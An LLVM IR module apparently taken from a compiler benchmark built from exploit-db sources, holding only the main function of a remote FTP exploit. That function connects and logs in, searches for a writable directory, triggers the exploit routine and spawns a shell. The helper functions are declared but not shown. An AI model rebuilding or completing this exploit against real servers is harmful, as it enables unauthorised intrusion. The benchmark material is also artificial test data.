; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { i32 (...)*, i64 }
%struct.TYPE_4__ = type { i64, i64 }
%struct.TYPE_6__ = type { i8* }

@SIGINT = common dso_local global i32 0, align 4
@sighandler = common dso_local global i32 0, align 4
@SIGQUIT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"Connecting...\0A\00", align 1
@sptr = common dso_local global %struct.TYPE_5__* null, align 8
@tesopt = common dso_local global %struct.TYPE_4__ zeroinitializer, align 8
@.str.1 = private unnamed_addr constant [50 x i8] c"Logged in! Searching for a writable directory...\0A\00", align 1
@.str.2 = private unnamed_addr constant [34 x i8] c"kurwa mac! no writable dir found\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"Logged in!\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"       %s is writable.. rock on!\0A\00", align 1
@hostinf = common dso_local global %struct.TYPE_6__ zeroinitializer, align 8
@.str.5 = private unnamed_addr constant [21 x i8] c"Trying to sploit...\0A\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"teso\0A\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"sploiting not successfull\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = call i32 (...) @title()
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %8, 3
  br i1 %9, label %10, label %15

10:                                               ; preds = %2
  %11 = load i8**, i8*** %5, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i32 @usage(i8* %13)
  br label %15

15:                                               ; preds = %10, %2
  %16 = load i32, i32* @SIGINT, align 4
  %17 = call i32 @signal(i32 %16, i8* bitcast (i32* @sighandler to i8*))
  %18 = load i32, i32* @SIGQUIT, align 4
  %19 = call i32 @signal(i32 %18, i8* bitcast (i32* @sighandler to i8*))
  %20 = load i32, i32* %4, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = call i32 @parseargs(i32 %20, i8** %21)
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (...) @connect_to_ftp()
  %25 = call i32 (...) @log_into_ftp()
  %26 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %27 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %26, i32 0, i32 1
  %28 = load i64, i64* %27, align 8
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %33, label %30

30:                                               ; preds = %15
  %31 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 1), align 8
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %40

33:                                               ; preds = %30, %15
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %35 = call i32 (...) @recurse_writable()
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %39, label %37

37:                                               ; preds = %33
  %38 = call i32 @err(i32 0, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0))
  br label %39

39:                                               ; preds = %37, %33
  br label %42

40:                                               ; preds = %30
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  br label %42

42:                                               ; preds = %40, %39
  %43 = call i32 (...) @getpwd()
  %44 = load i8*, i8** getelementptr inbounds (%struct.TYPE_6__, %struct.TYPE_6__* @hostinf, i32 0, i32 0), align 8
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i8* %44)
  %46 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 1), align 8
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %67, label %48

48:                                               ; preds = %42
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  %50 = load %struct.TYPE_5__*, %struct.TYPE_5__** @sptr, align 8
  %51 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %50, i32 0, i32 0
  %52 = load i32 (...)*, i32 (...)** %51, align 8
  %53 = call i32 (...) %52()
  %54 = load i64, i64* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @tesopt, i32 0, i32 0), align 8
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %58

56:                                               ; preds = %48
  %57 = call i32 @check_test_return(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32 5)
  store i32 %57, i32* %6, align 4
  br label %60

58:                                               ; preds = %48
  %59 = call i32 (...) @shell()
  br label %60

60:                                               ; preds = %58, %56
  %61 = phi i32 [ %57, %56 ], [ %59, %58 ]
  %62 = load i32, i32* %6, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %66, label %64

64:                                               ; preds = %60
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %60
  br label %67

67:                                               ; preds = %66, %42
  %68 = call i32 (...) @cleanup_and_exit()
  ret i32 0
}

declare dso_local i32 @title(...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @signal(i32, i8*) #1

declare dso_local i32 @parseargs(i32, i8**) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @connect_to_ftp(...) #1

declare dso_local i32 @log_into_ftp(...) #1

declare dso_local i32 @recurse_writable(...) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @getpwd(...) #1

declare dso_local i32 @check_test_return(i8*, i32) #1

declare dso_local i32 @shell(...) #1

declare dso_local i32 @cleanup_and_exit(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
